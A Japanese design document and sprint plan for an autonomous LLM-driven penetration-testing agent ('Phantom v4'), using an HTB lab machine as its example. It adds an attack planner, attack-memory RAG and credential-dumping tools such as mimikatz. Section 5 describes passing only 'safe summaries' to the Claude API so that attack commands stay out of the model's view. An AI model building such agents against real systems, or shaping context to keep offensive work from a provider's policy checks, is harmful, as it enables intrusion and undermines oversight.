BM25検索:     [Doc_B(rank1), Doc_C(rank2)]
→ RRF: Doc_B(0.0329) > Doc_A(0.0164) > Doc_C(0.0156)
```

**Phantomとの接続ポイント**:

```
orchestrator.py の _debrief() を改修:

ミッション完了時:
  1. AttackMemory.save_attack(
       target="kobold.htb",
       scenario="MCPJam Inspector RCE → Docker socket escape",
       tools_used=["run_nmap", "run_whatweb", "forge_tool"],
       cve_exploited=["CVE-2026-23744"],
       success=True,
       attack_chain={"initial": "MCPJam /api/mcp/connect", "privesc": "sg docker"},
       credentials_obtained={"user": "ben", "group": "operator"},
     )

  2. StrategyMemory.extract_strategy(
       actions=[all_actions_from_session],
       target="kobold.htb",
       objective="HTB flag capture",
       success=True,
     )
     → tool_sequence: ["run_nmap", "ffuf", "run_whatweb", "forge_tool"]
     → phase_transitions: [{recon→scan, tool: ffuf}, {scan→exploit, tool: forge_tool}]

  3. StrategyMemory.save_meta_pattern(
       pattern_type="failure_recovery",
       trigger={"error": "TLS handshake timeout"},
       action={"solution": "--tls-max 1.2 --tlsv1.2"},
       success=True,
     )

次のセッション起動時:
  HypothesisEngine._generate_rag():
    AttackMemory.search_hybrid("web app, Docker management, MCP")
    → kobold.htbの攻撃手順がヒット
    → 「MCPJam /api/mcp/connect RCE → Docker escape」を仮説として自動提案
```


---


## 5. コンテキスト管理とAPIポリシー安全性

### 5.1 安全性の保証構造

統合する全ての機能はPhantom内部で動作するPython構造であり、Claude APIに送信されるコンテンツの形式は変わらない。

```
┌──────────────────────────────────────────────────────────┐
│  Phantom 内部（Claude APIに送信されない）                   │
│                                                          │
│  StateStore (SQLite) ← 短期記憶（セッション内）             │
│  RAG (PostgreSQL+pgvector) ← 長期記憶（セッション間）       │
│  ErrorHandler ← エラー分類・回復判断                       │
│  LLMRouter ← モデル選択                                   │
│  EGATS+Forest ← 攻撃計画                                 │
│  4層仮説生成 ← 仮説提案                                    │
│                                                          │
│  ↓ system promptに注入する際に「安全な要約」に変換           │
│                                                          │
│  「kobold.htb: 4 ports, CVE-2026-23744 on               │
│    mcp.kobold.htb:/api/mcp/connect (confirmed)」         │
│  → 詳細は保持しつつ、攻撃コマンドやペイロードは含まない      │
│                                                          │
└──────────────────────────┬───────────────────────────────┘
                           ▼ (安全な要約のみ送信)
┌──────────────────────────────────────────────────────────┐
│  Claude API (messages.create)                            │
│                                                          │
│  system: "Targets: kobold.htb, CVE-2026-23744 on ..."   │
│  tools: [{name: "run_nmap"}, {name: "forge_tool"}, ...]  │
│  messages: [tool_use + tool_result(テキスト)]              │
│                                                          │
│  → Claudeはtool_use名+JSONパラメータのみ返す               │
│  → コマンドやペイロードは生成しない                          │
└──────────────────────────────────────────────────────────┘
```


### 5.2 圧縮改善: 単純切り捨て → StateStore連携

現在の `_compact_old_tool_results()` は先頭400文字で単純切り捨て。StateStore統合後は、StateStoreに登録済みのエンティティ情報はtool_resultから安全に圧縮可能。

```
現在: "Nmap scan report for kobold.htb... PORT 22/tcp open ssh..." [400文字で切断]
改善: "Nmap scan: 4 ports found (details in StateStore)" [要約 + StateStoreに詳細保持]
```


### 5.3 StateStoreとRAGの役割分担

| 層 | 役割 | ライフサイクル | APIポリシー影響 |
|---|---|---|---|
| **StateStore** | 1セッション内の構造化データ管理。tool_result圧縮時の情報保持 | セッション中（RAM+SQLite） | **なし** |
| **RAG AttackMemory** | セッション間の攻撃知識蓄積。成功/失敗パターンの学習 | 永続（PostgreSQL） | **なし** |
| **RAG StrategyMemory** | セッション間のツール順序・フェーズ遷移の学習 | 永続（PostgreSQL） | **なし** |
| **RAG MetaPatterns** | セッション間の失敗回復パターン蓄積 | 永続（PostgreSQL） | **なし** |


---


## 6. 統合後のアーキテクチャ全体図

```
Phantom v4 (統合版)
│
├── planner/                           [NEW] Nirvanaから移植
│   ├── egats.py                         EGATSPlanner: init_tree, select_next_node
│   ├── ucb.py                           UCBノード選択（φ + 探索 - 難易度）
│   ├── tda.py                           TDAComputer: compute_tdi (4次元)
│   ├── backpropagation.py               指数平滑（α=0.7）
│   ├── pruning.py                       TDI閾値枝刈り + 認証再開
│   ├── pivot.py                         横展開 + クレデンシャル伝播
│   ├── forest.py                        ForestUCB: マルチホスト管理
│   ├── models.py                        AttackNode, AttackTree, NodeType等
│   └── mode_selector.py                 TDI→recon/exploit/llm_decide
│
├── reasoning/
│   ├── hypothesis_engine.py           [EXTEND] 4層仮説生成を追加
│   │                                    第1層: ルールベース + プロダクトカタログ(20+製品)
│   │                                    第2層: 出力駆動
│   │                                    第3層: RAGベース
│   │                                    第4層: LLM動的
│   ├── reflector.py                     既存（停滞検出）
│   ├── strategist.py                    既存（攻撃チェーン分析）
│   ├── context_manager.py               既存（トークン予算）
│   └── types.py                         既存（AttackState等）
│
├── execution/                         [NEW]
│   └── error_handler.py                 ErrorHandler: 13型×7回復
│
├── providers/
│   ├── __init__.py                      既存（get_provider ファクトリ）
│   ├── llm_router.py                  [NEW] TDI→モデル選択
│   ├── anthropic_provider.py            既存（OAuth対応済）
│   ├── openai_provider.py               既存
│   ├── ollama_provider.py               既存
│   ├── gemini_provider.py               既存
│   └── mistral_provider.py              既存
│
├── tools/                               既存27ツール
│   ├── __init__.py                      既存（TOOL_REGISTRY, TOOL_SPECS）
│   ├── forge.py                         既存（動的ツール生成）
│   ├── scope_checker.py                 既存（スコープ強制）
│   ├── sandbox.py                       既存（サンドボックス）
│   ├── nmap_scan.py                     既存
│   ├── ...                              既存22ツール
│   └── active_directory.py            [NEW] Excaliburから移植（BloodHound等8ツール）
│
├── memory/
│   ├── mission_memory.py                既存
│   ├── persistence.py                   既存（MissionDB SQLite）
│   ├── state_store.py                 [NEW] Excaliburから移植
│   ├── entity_models.py               [NEW] Host/Service/Vuln/Cred/Session
│   ├── timeline.py                      既存
│   └── rag/                           [NEW] Nirvanaから移植
│       ├── attack_memory.py             攻撃記憶（pgvector+BM25）
│       ├── strategy_memory.py           戦略記憶 + メタパターン
│       ├── rrf_fusion.py                RRF融合
│       └── vector_embedding.py          sentence-transformers
│
├── models/                              既存
│   ├── findings.py                      既存
│   ├── plans.py                         既存
│   ├── graph.py                         既存
│   ├── events.py                        既存
│   └── state.py                         既存
│
├── orchestrator.py                    [MODIFY] PAOR + EGATS ハイブリッド
│   │
│   │  改修ポイント:
│   │  - run_mission(): EGATSPlanner.init_tree() + AttackForest初期化
│   │  - _plan_phase(): UCBノード選択 → TDI → LLMRouter → tool_use
│   │  - _act_phase(): ErrorHandler連携
│   │  - _observe_phase(): StateStore登録 + expand_tree()
│   │  - _reflect_phase(): backpropagate() + check_pruning()
│   │  - _format_state_summary(): StateStoreから詳細要約生成
│   │  - _debrief(): RAG保存（AttackMemory + StrategyMemory）
│   │
├── mcp_bridge.py                        既存（MCPブリッジ）
├── config.yaml                          既存 + RAG/Router設定追加
└── .venv/                               既存
```


---


## 7. スプリント実装計画

### 7.1 実装方針

改修は以下の原則に従い、慎重に一つずつ進める。

**原則1: 他に影響を及ぼさない順序で進める。** 依存関係を厳密に分析し、既存コードへの影響が最小のコンポーネントから着手する。各コンポーネントは`_safe_import_component()`パターンで遅延ロードし、未導入でもPhantomが既存機能で動作し続けることを保証する。

**原則2: スプリントごとに徹底検証する。** 各スプリント完了時に以下を実施する。
- ユニットテスト: 新規コンポーネント単体の動作確認
- 統合テスト: Orchestratorとの接続確認
- 実データ検証: 実際にインスタンス化し、kobold.htb相当のデータを流して期待通りの出力が得られることを確認
- 回帰テスト: 既存の363テストが全て通ることを確認

**原則3: PostgreSQLスキーマは最初に一括設計する。** StateStore（スプリント1）とRAG（スプリント7〜9）が同じPostgreSQLを使う。後からスキーマを追加すると改修が大変になるため、スプリント1でDB層の抽象化と全テーブルのスキーマを設計し、実際のテーブル作成は各スプリントで行う。

**原則4: 既存機能は一切削除しない。** 全ての改修は付加的な機能強化であり、既存の27ツール、forge_tool、scope_guard、sandbox、MCPブリッジ、OAuth認証、8プロバイダは全てそのまま維持される。


### 7.2 依存関係分析（実装順序の根拠）

ソースコードのimport文を全て確認し、コンポーネント間の依存関係を確定した。

```
依存関係グラフ（→ は「依存する」を意味）:

ErrorHandler       → 依存なし（Python標準ライブラリのみ）
StateStore         → 依存なし（sqlite3/psycopg2 + pydantic）
ADツール            → 依存なし（subprocess、既存ツールと同パターン）
LLMRouter          → 依存なし（Phantomの既存プロバイダに接続するだけ）
RAG AttackMemory   → rrf_fusion, vector_embedding（RAG内部のみ）
RAG StrategyMemory → rrf_fusion, vector_embedding（RAG内部のみ）
EGATS (ucb/tda/backprop/pruning/pivot/models) → 依存なし（内部モジュール間のみ）
EGATS Forest       → StateStore（ホスト/サービス情報の参照）
4層仮説生成         → StateStoreのto_dict()結果を参照
メモリ蒸留          → RAG AttackMemory + StrategyMemory

したがって安全な実装順序:
  1. ErrorHandler（完全独立）
  2. DB層設計 + StateStore（完全独立）
  3. ADツール（完全独立）
  4. EGATS コア（ucb/tda/backprop/pruning/models — 完全独立）
  5. 事前バリデーション（scope_guard拡張 + StateStore参照）
  6. 4層仮説生成（StateStore参照）
  7. EGATS Forest + Orchestrator統合（StateStore + EGATS コア依存）
  8. LLMRouter（EGATS統合後にTDI値が利用可能）
  9. RAG基盤（attack_memory, strategy_memory, rrf, embedding）
  10. メモリ蒸留 + debrief改修（RAG依存）
  11. 仮説第3層（RAGベース）有効化（RAG依存）
```


### 7.3 スプリント詳細

---

#### スプリント1: ErrorHandler（完全独立、既存コードへの影響ゼロ）

**目的**: ツール実行エラーを体系的に分類し、自動回復アクションを実行する。kobold.htbのF2（TLS 1.3タイムアウト）、F3（認証失敗ループ）を解決する。

**移植元**: Nirvana `nirvana/execution/error_handler.py`（205行）

**新規ファイル**: `agent/execution/__init__.py`, `agent/execution/error_handler.py`

**改修ファイル**: `agent/orchestrator.py`（`_execute_tool()`メソッドに6行追加）

**他コンポーネントへの依存**: なし（Python標準ライブラリのみ: re, enum, dataclass）

**Orchestratorとの接続**:

```python
# orchestrator.py __init__() に追加（1行）
self._error_handler = self._safe_import_component("ErrorHandler", "execution.error_handler")

# orchestrator.py _execute_tool() に追加（6行）
result = tool_func(**tool_input)
if self._error_handler and result and "error" in str(result).lower():
    error_type = self._error_handler.classify(str(result), tc["name"])
    if error_type != ErrorType.UNKNOWN:
        recovery = self._error_handler.recover(error_type, {"tool": tc["name"], "input": tool_input})
        logger.info("ErrorHandler: %s → %s: %s", error_type, recovery.action, recovery.suggestion)
        # recovery.action に応じたリトライロジック
```

**検証手順**:

1. ユニットテスト: ErrorHandler単体で13エラー型の分類が正しいことを確認
   ```python
   handler = ErrorHandler()
   assert handler.classify("Connection refused", "nmap") == ErrorType.CONNECTION_REFUSED
   assert handler.classify("403 Forbidden", "curl") == ErrorType.WAF_BLOCKED
   assert handler.classify("KDC_ERR_PREAUTH", "kerbrute") == ErrorType.AD_KERBEROS_ERROR
   assert handler.classify("TLS handshake timeout", "curl") == ErrorType.SSL_CERTIFICATE_ERROR
   recovery = handler.recover(ErrorType.WAF_BLOCKED, {})
   assert recovery.action == RecoveryAction.REDUCE_AGGRESSION
   ```

2. 統合テスト: Orchestratorに組込み、`_execute_tool()`がエラー時にErrorHandlerを呼出すことを確認

3. 実データ検証: kobold.htbの実際のエラー出力（TLS timeout, "Invalid username or password"）を入力し、正しい分類と回復アクションが返ることを確認

4. 回帰テスト: `python -m pytest tests/` で既存363テストが全てパス

---

#### スプリント2: DB層設計 + StateStore（完全独立、既存コードへの影響ゼロ）

**目的**: ホスト、サービス、脆弱性、クレデンシャル、セッションを構造化エンティティとして管理する。tool_result圧縮による情報損失（kobold.htbのF1/F3/F4）を解決する。また、RAG（スプリント9）で使用するPostgreSQLスキーマを先行設計する。

**移植元**: Excalibur `excalibur/memory/state_store.py`（688行）+ `excalibur/memory/models.py`（76行）

**新規ファイル**: `agent/memory/db.py`（DB接続抽象化）, `agent/memory/state_store.py`, `agent/memory/entity_models.py`

**改修ファイル**: `agent/orchestrator.py`（`__init__`, `_observe_phase`, `_format_state_summary` に計20〜30行追加）

**他コンポーネントへの依存**: なし

**DB層設計（PostgreSQL + SQLiteフォールバック）**:

```python
# agent/memory/db.py — 全スプリントで共用するDB接続管理
class DatabaseManager:
    def __init__(self, db_url: str):
        # db_url = "postgresql://user:pass@host/dbname" → psycopg2
        # db_url = "sqlite:///path/to/file.db" → sqlite3
        # db_url = ":memory:" → sqlite3 インメモリ

    def execute(self, sql: str, params: tuple = ()) -> list
    def executemany(self, sql: str, params_list: list) -> None
    def init_schema(self, schema_sql: str) -> None
```

**スキーマ設計（全スプリントのテーブルを一括設計、作成は各スプリントで）**:

```sql
-- スプリント2で作成
CREATE TABLE IF NOT EXISTS hosts (...);
CREATE TABLE IF NOT EXISTS services (...);
CREATE TABLE IF NOT EXISTS credentials (...);
CREATE TABLE IF NOT EXISTS sessions (...);
CREATE TABLE IF NOT EXISTS vulnerabilities (...);

-- スプリント9で作成（スキーマのみ先行設計）
-- CREATE TABLE IF NOT EXISTS attacks (...);
-- CREATE TABLE IF NOT EXISTS strategies (...);
-- CREATE TABLE IF NOT EXISTS meta_patterns (...);
```

**Orchestratorとの接続**:

```python
# orchestrator.py __init__() に追加（2行）
db_url = config.get("db_url", ":memory:")
self._state_store = StateStore(db_url=db_url)

# orchestrator.py _observe_phase() に追加（nmap結果のパース例）
if tool_name == "run_nmap" and not content.startswith("Error"):
    # nmap出力からホスト/サービスを抽出してStateStoreに登録
    parsed = self._parse_nmap_output(content)
    for host_info in parsed.get("hosts", []):
        host_id = self._state_store.add_host(HostEntity(
            ip_address=host_info["ip"],
            hostname=host_info.get("hostname"),
        ))
        for svc in host_info.get("services", []):
            self._state_store.add_service(ServiceEntity(
                host_id=host_id,
                port=svc["port"],
                service_name=svc["service"],
                version=svc.get("version"),
            ))

# orchestrator.py _format_state_summary() を改修
# StateStoreから詳細情報を含む要約を生成
hosts = self._state_store.get_hosts()
for host in hosts:
    services = self._state_store.get_services_for_host(host.id)
    vulns = self._state_store.get_vulnerabilities_for_host(host.id)
    svc_str = ", ".join(f"{s.port}/{s.service_name}" for s in services)
    lines.append(f"  {host.ip_address} ({host.hostname}): {svc_str}")
    for v in vulns:
        lines.append(f"    [{v.exploitation_status}] {v.cve_id}: {v.description[:60]}")
```

**検証手順**:

1. ユニットテスト: StateStore単体でCRUD操作（add/get/list）が正しいことを確認。SQLiteモードとPostgreSQLモードの両方でテスト
   ```python
   store = StateStore(db_url=":memory:")
   host_id = store.add_host(HostEntity(ip_address="10.129.245.50", hostname="kobold.htb"))
   assert store.get_host_by_ip("10.129.245.50").hostname == "kobold.htb"
   svc_id = store.add_service(ServiceEntity(host_id=host_id, port=80, service_name="http"))
   assert len(store.get_services_for_host(host_id)) == 1
   ```

2. 統合テスト: Orchestratorに組込み、nmap/nuclei/whatwebの実行結果がStateStoreに正しく登録されることを確認

3. 実データ検証: kobold.htbのnmap出力（4ポート）を入力し、StateStoreに4サービスが登録され、`_format_state_summary()`が「kobold.htb: 22/ssh, 80/http, 443/https, 3552/http」を出力することを確認

4. 回帰テスト: 既存363テスト全パス + StateStoreなしでもPhantomが既存通り動作することを確認

---

#### スプリント3: ADツール追加（完全独立、TOOL_REGISTRYへの追加のみ）

**目的**: Active Directory / Windows環境への対応力を拡張する。

**移植元**: Excalibur `excalibur/tools/categories/active_directory.py`（944行）

**新規ファイル**: `agent/tools/active_directory.py`

**改修ファイル**: `agent/tools/__init__.py`（`_optional`リストに`"active_directory"`を追加、1行）

**他コンポーネントへの依存**: なし（subprocess呼出、既存ツールと同一パターン）

**追加されるツール（8ツール）**:

| ツール | 機能 | 外部バイナリ |
|---|---|---|
| bloodhound | ADリレーションシップマッピング | bloodhound-python |
| sharphound | BloodHoundデータ収集（Windows） | sharphound |
| rubeus | Kerberosチケット攻撃 | rubeus |
| mimikatz | クレデンシャルダンプ | mimikatz |
| powerview | AD偵察（PowerShell） | powershell |
| ldapdomaindump | LDAPディレクトリ列挙 | ldapdomaindump |
| pingcastle | ADリスクスコアリング | pingcastle |
| adrecon | AD包括監査 | adrecon |

**検証手順**:

1. ユニットテスト: 各ツールのTOOL_SPECが正しいJSON Schema形式であることを確認
2. 統合テスト: `from tools import TOOL_REGISTRY` で8ツールが登録されることを確認（既存27 + 8 = 35ツール）
3. MCP検証: `mcp_bridge.py` で35ツール全てがFastMCPに登録されることを確認
4. 回帰テスト: 既存363テスト全パス

---

#### スプリント4: EGATS コア（完全独立、Orchestratorへの接続なし）

**目的**: UCB+TDA+バックプロパゲーション+枝刈りの攻撃計画エンジンを追加する。このスプリントではOrchestratorとの接続は行わず、コンポーネント単体の動作を確認する。

**移植元**: Nirvana `nirvana/planner/`（egats.py, ucb.py, tda.py, backpropagation.py, pruning.py, pivot.py, models.py, mode_selector.py — Forest以外）

**新規ファイル**: `agent/planner/__init__.py`, `agent/planner/egats.py`, `agent/planner/ucb.py`, `agent/planner/tda.py`, `agent/planner/backpropagation.py`, `agent/planner/pruning.py`, `agent/planner/pivot.py`, `agent/planner/models.py`, `agent/planner/mode_selector.py`

**改修ファイル**: なし（このスプリントではOrchestratorに接続しない）

**他コンポーネントへの依存**: なし（planner/内部モジュール間の依存のみ）

**検証手順**:

1. ユニットテスト: NirvanaのEGATSと同一の動作を確認
   ```python
   planner = EGATSPlanner()
   tree = planner.init_tree("10.129.245.50")
   assert len(tree.nodes) == 1  # ルートノードのみ
   
   node = planner.select_next_node(tree)
   assert node is not None
   
   tdi = planner.compute_tdi(node, tree, context_load=0.2)
   assert 0.0 <= tdi.value <= 1.0
   
   mode = planner.select_mode(tdi)
   assert mode in ("reconnaissance", "exploitation", "llm_decide")
   
   backpropagate(tree, node, ActionOutcome.SUCCESS)
   assert node.promise_score > 0.5  # 成功で上昇
   
   assert not should_prune(node)  # まだ訪問回数が少ない
   
   pivot = spawn_pivot(tree, "10.129.245.51", node)
   assert pivot.host == "10.129.245.51"
   assert "10.129.245.51" in tree.compromised_hosts
   ```

2. 実データ検証: kobold.htbのシナリオ（4ポート発見→Arcane調査→行き詰まり→ピボット）をシミュレートし、TDIが上昇して枝刈りが発生することを確認

3. 回帰テスト: 既存363テスト全パス（Orchestratorに接続していないため影響なし）

---

#### スプリント5: 事前バリデーション（scope_guard拡張 + StateStore参照）

**目的**: ツール実行前にパラメータの妥当性とStateStoreとの整合性を検証する。Co-RedTeamのValidation Agent概念をプログラム的に実装する。

**新規ファイル**: `agent/execution/pre_validator.py`（~80行）

**改修ファイル**: `agent/orchestrator.py`（`_execute_tool()`に5行追加）

**依存**: StateStore（スプリント2）

**検証内容**:

```python
# agent/execution/pre_validator.py
class PreValidator:
    def __init__(self, state_store: StateStore, scope_checker):
        self._store = state_store
        self._scope = scope_checker

    def validate(self, tool_name: str, tool_input: dict) -> tuple[bool, str]:
        # 1. targetパラメータがスコープ内か再確認
        target = tool_input.get("target") or tool_input.get("url") or ""
        if target and self._scope:
            guard = self._scope(target)
            if guard is not None:
                return False, f"Scope violation: {guard}"

        # 2. StateStoreとの整合性チェック
        #    例: run_sqlmapのURLに含まれるホストがStateStoreに登録されているか
        #    未登録なら「先にnmapで偵察すべき」と提案

        # 3. ツール固有のパラメータ型チェック
        #    例: run_nmapのportsが文字列か、run_sqlmapのlevelが1-5の範囲内か

        return True, ""
```

**検証手順**:

1. ユニットテスト: 不正パラメータ（スコープ外target、不正なport値等）が拒否されることを確認
2. 統合テスト: Orchestratorの`_execute_tool()`が事前バリデーション失敗時にツール実行をスキップすることを確認
3. 回帰テスト: 既存363テスト全パス

---

#### スプリント6: 4層仮説生成エンジン（StateStore参照）

**目的**: Phantomの既存HypothesisEngineを4層構造に拡張する。PRODUCT_CATALOG（18+製品）とSSRF_HOSTNAME_PATTERNS（9カテゴリ・70+パターン）を組み込む。kobold.htbのF1（サブドメイン発見失敗）、F4（MCPJam未発見）を解決する。

**移植元**: Nirvana `nirvana/reasoning/hypothesis_engine.py`（1,285行）

**改修ファイル**: `agent/reasoning/hypothesis_engine.py`（既存を拡張、またはNirvana版で差替）

**依存**: StateStore（スプリント2）のto_dict()結果を参照

**検証手順**:

1. ユニットテスト: 4層それぞれの仮説生成を確認
   ```python
   he = HypothesisEngine()
   hyps = he.generate_hypotheses({
       "hosts": [{"ip": "10.129.245.50", "hostname": "kobold.htb"}],
       "services": [
           {"host": "10.129.245.50", "port": 80, "service": "http", "product": "nginx"},
           {"host": "10.129.245.50", "port": 3552, "service": "http", "product": "golang"},
       ],
       "subdomains": ["mcp.kobold.htb", "bin.kobold.htb"],
   })
   # "mcp.kobold.htb" → SSRF_HOSTNAME_PATTERNSの"mcp"カテゴリにマッチ
   # → PRODUCT_CATALOGの"mcpjam"エントリから仮説生成
   mcpjam_hyps = [h for h in hyps if "mcpjam" in h.description.lower() or "mcp" in h.description.lower()]
   assert len(mcpjam_hyps) > 0  # MCPJam仮説が自動生成されること
   ```

2. 実データ検証: kobold.htbのStateStoreデータ（4ポート、2サブドメイン）を入力し、MCPJam RCE仮説がconfidence 0.75で生成されることを確認

3. 回帰テスト: 既存363テスト全パス + 既存のburst_launch()も引き続き動作すること

---

#### スプリント7: EGATS Forest + Orchestrator統合（最大の改修スプリント）

**目的**: EGATS（スプリント4）とStateStore（スプリント2）をForestUCBで統合し、OrchestratorのPAORループに組み込む。kobold.htbのF3（13分行き詰まり → 自動ピボット）を解決する。

**移植元**: Nirvana `nirvana/planner/forest.py`（293行）

**新規ファイル**: `agent/planner/forest.py`

**改修ファイル**: `agent/orchestrator.py`（`run_mission`, `_plan_phase`, `_observe_phase`, `_reflect_phase` の4メソッドを改修）

**依存**: StateStore（スプリント2）+ EGATS コア（スプリント4）

**Orchestrator改修の詳細**:

```python
# run_mission(): 初期化にEGATSプランナーとForestを追加
def run_mission(self, scope_targets):
    # 既存: burst_launch()
    # 追加:
    self._egats_planner = EGATSPlanner()
    self._forest = AttackForest(
        initial_target=scope_targets[0],
        state_store=self._state_store,
        planner=self._egats_planner,
    )

# _plan_phase(): UCBノード選択を追加
def _plan_phase(self):
    # 既存: LLMにtool_specsを渡してtool_useを取得
    # 追加（既存の前に挿入）:
    if self._forest:
        tree_id, tree = self._forest.select_next_tree()
        node = self._egats_planner.select_next_node(tree)
        tdi = self._egats_planner.compute_tdi(node, tree, context_load)
        mode = self._egats_planner.select_mode(tdi)
        # modeをsystem promptに注入（「recon重視」「exploit重視」等）

# _observe_phase(): 攻撃ツリー更新を追加
def _observe_phase(self, tool_calls, tool_results, text_blocks):
    # 既存: Finding抽出、StateStore登録
    # 追加:
    if self._egats_planner and self._current_node:
        outcome = self._assess_outcome(findings)
        self._egats_planner.backpropagate(tree, self._current_node, outcome)
        self._egats_planner.check_pruning(tree)
        if new_host_discovered:
            self._egats_planner.spawn_pivot(tree, new_host, self._current_node)

# _reflect_phase(): 枝刈り情報をReflectorに統合
def _reflect_phase(self):
    # 既存: stall detection
    # 追加: 枝刈りされたノードの情報をReflectorに渡す
```

**検証手順**:

1. 統合テスト: Orchestratorのrun_mission()が正常に起動し、PAORループ内でEGATSノード選択が行われることを確認

2. 実データ検証: kobold.htbシナリオをシミュレート
   - ターン1-3: nmap→StateStore登録→ノードexpand
   - ターン4-8: Arcane認証試行→失敗→TDI上昇→promise低下
   - ターン9: 枝刈り発生→UCBが未訪問ノード（サブドメイン列挙）を選択
   - ターン10: mcp.kobold.htb発見→MCPJam仮説→RCE

3. 回帰テスト: 既存363テスト全パス + EGATS無効時（`_forest = None`）に既存動作が維持されること

---

#### スプリント8: LLMRouter（EGATS統合後に自然に追加）

**目的**: TDI値に基づいて最適なLLMモデルを自動選択する。簡単な偵察タスクにはローカルLLM（コスト0）、困難なエクスプロイト判断にはClaude（高品質）を使い分ける。

**移植元**: Nirvana `nirvana/core/llm_router.py`（343行）

**新規ファイル**: `agent/providers/llm_router.py`

**改修ファイル**: `agent/orchestrator.py`（`_plan_phase()`に5行追加）, `agent/providers/__init__.py`（`get_provider_for_model()`関数追加）

**依存**: EGATS（スプリント7でTDI値が利用可能）

**NirvanaのLLMRouterからの修正点**: `nirvana.core.backend.AgentBackend` への依存を削除し、Phantomの既存`get_provider()`ファクトリに接続する。

**検証手順**:

1. ユニットテスト: TDI値に応じたモデル選択を確認
   ```python
   router = LLMRouter(strategy=RoutingStrategy.COST_OPTIMIZED, models=[
       ModelConfig(model_id="claude-sonnet-4-6", provider="anthropic", cost_per_1k_input=0.003),
       ModelConfig(model_id="local-model", provider="ollama", cost_per_1k_input=0.0, is_local=True),
   ])
   assert router.select_model(0.2, "enumerate ports").model_id == "local-model"
   assert router.select_model(0.8, "exploit CVE").model_id == "claude-sonnet-4-6"
   ```

2. 統合テスト: Orchestratorが`_plan_phase()`内でLLMRouterを使い、TDIに応じてプロバイダを切り替えることを確認

3. 回帰テスト: 既存363テスト全パス + LLMRouter無効時に既存プロバイダが使用されること

---

#### スプリント9: RAG基盤（PostgreSQL + pgvector + sentence-transformers）

**目的**: 攻略完遂後の成功/失敗を蓄積し、今後のミッションで知見として活用する。セッション間知識共有の基盤を構築する。

**移植元**: Nirvana `nirvana/memory/rag/`（attack_memory.py, strategy_memory.py, rrf_fusion.py, vector_embedding.py, db_config.py — 計2,240行）

**新規ファイル**: `agent/memory/rag/__init__.py`, `agent/memory/rag/attack_memory.py`, `agent/memory/rag/strategy_memory.py`, `agent/memory/rag/rrf_fusion.py`, `agent/memory/rag/vector_embedding.py`, `agent/memory/rag/db_config.py`

**改修ファイル**: なし（このスプリントではOrchestratorに接続しない。スプリント10で接続）

**依存**: DB層（スプリント2で設計済みのPostgreSQLスキーマ）

**前提条件**: PostgreSQL + pgvector拡張がインストールされていること。sentence-transformersがpip installされていること。

**NirvanaのRAGからの修正点**: `nirvana.memory.rag.xxx` のインポートパスを `agent.memory.rag.xxx` に変更するのみ。外部依存（psycopg2, sentence-transformers）は変更なし。

**検証手順**:

1. ユニットテスト: AttackMemory/StrategyMemory単体でCRUD+検索が正しいことを確認
   ```python
   memory = AttackMemory(db_config="postgresql://...")
   attack_id = memory.save_attack(
       target="kobold.htb",
       scenario="MCPJam Inspector RCE → Docker socket escape",
       tools_used=["run_nmap", "run_whatweb", "forge_tool"],
       cve_exploited=["CVE-2026-23744"],
       success=True,
   )
   results = memory.search_hybrid("MCPJam Docker management", top_k=3)
   assert len(results) > 0
   assert results[0]["target"] == "kobold.htb"
   ```

2. RRF融合テスト: ベクトル検索とBM25検索の結果がRRFで正しく統合されることを確認

3. 回帰テスト: 既存363テスト全パス（Orchestratorに接続していないため影響なし）

---

#### スプリント10: メモリ蒸留 + debrief改修（RAGへの自動保存）

**目的**: ミッション完了時にAttackMemory/StrategyMemoryに攻撃知識を自動保存する。LLMベースのメモリ蒸留で抽象的教訓も抽出する。

**新規ファイル**: `agent/memory/rag/distiller.py`（~100行）

**改修ファイル**: `agent/orchestrator.py`（`_debrief()`に20行追加）

**依存**: RAG基盤（スプリント9）

**メモリ蒸留の実装**:

```python
# agent/memory/rag/distiller.py
class MemoryDistiller:
    def __init__(self, provider: BaseLLMProvider):
        self._provider = provider

    def distill(self, session_summary: dict) -> dict:
        """LLMでセッション軌跡から抽象的教訓を抽出"""
        prompt = f"""以下のペネトレーションテスト結果から、今後のミッションに活かせる抽象的な教訓を3〜5個抽出してください。
        
ターゲット: {session_summary["target"]}
使用ツール: {session_summary["tools_used"]}
発見脆弱性: {session_summary["findings"]}
攻撃チェーン: {session_summary["attack_chain"]}
成功/失敗: {session_summary["success"]}

教訓をJSON配列で返してください。各教訓は {{"lesson": "...", "category": "...", "confidence": 0.0-1.0}} の形式で。"""

        text_blocks, _ = self._provider.call_with_retry(
            [{"role": "user", "content": prompt}],
            "You are a security analyst extracting lessons learned.",
            [],
        )
        return json.loads(text_blocks[0])
```

**検証手順**:

1. ユニットテスト: MemoryDistillerがLLMを呼出し、教訓を構造化形式で返すことを確認
2. 統合テスト: `_debrief()`完了後にRAGに攻撃記録と戦略が保存されていることをDB直接クエリで確認
3. 実データ検証: kobold.htb攻略データでdebrief→RAG保存→search_hybridでヒットする一連のフローを確認
4. 回帰テスト: 既存363テスト全パス

---

#### スプリント11: 仮説第3層（RAGベース）有効化

**目的**: 4層仮説生成エンジンの第3層（RAGベース）を有効化する。過去のミッションで蓄積した攻撃知識を新しいミッションの仮説生成に活用する。

**改修ファイル**: `agent/reasoning/hypothesis_engine.py`（`_generate_rag()`メソッドのスタブを実装に変更）

**依存**: RAG基盤（スプリント9）+ 4層仮説生成（スプリント6）

**検証手順**:

1. ユニットテスト: RAGに保存されたkobold.htbデータが、類似ターゲットの仮説生成に反映されることを確認
   ```python
   # RAGにkobold.htbデータが保存されている前提
   he = HypothesisEngine(attack_memory=attack_memory)
   hyps = he.generate_hypotheses({
       "hosts": [{"ip": "10.129.100.50", "hostname": "similar.htb"}],
       "services": [{"host": "10.129.100.50", "port": 3552, "service": "http"}],
       "subdomains": ["mcp.similar.htb"],
   })
   # RAG第3層がkobold.htbの知見を基に「MCPJam RCE」仮説を提案
   rag_hyps = [h for h in hyps if h.source == "rag"]
   assert len(rag_hyps) > 0
   ```

2. 回帰テスト: 既存テスト全パス + RAG未接続時にスタブとして動作すること


### 7.4 スプリントサマリと依存関係図

```
スプリント1: ErrorHandler ←── 依存なし（完全独立）
    │
スプリント2: DB層 + StateStore ←── 依存なし（完全独立）
    │
スプリント3: ADツール ←── 依存なし（完全独立）
    │
スプリント4: EGATS コア ←── 依存なし（完全独立）
    │
    ├── スプリント5: 事前バリデーション ←── StateStore (スプリント2)
    │
    ├── スプリント6: 4層仮説生成 ←── StateStore (スプリント2)
    │
    └── スプリント7: EGATS Forest + Orchestrator統合 ←── StateStore (スプリント2) + EGATS (スプリント4)
         │
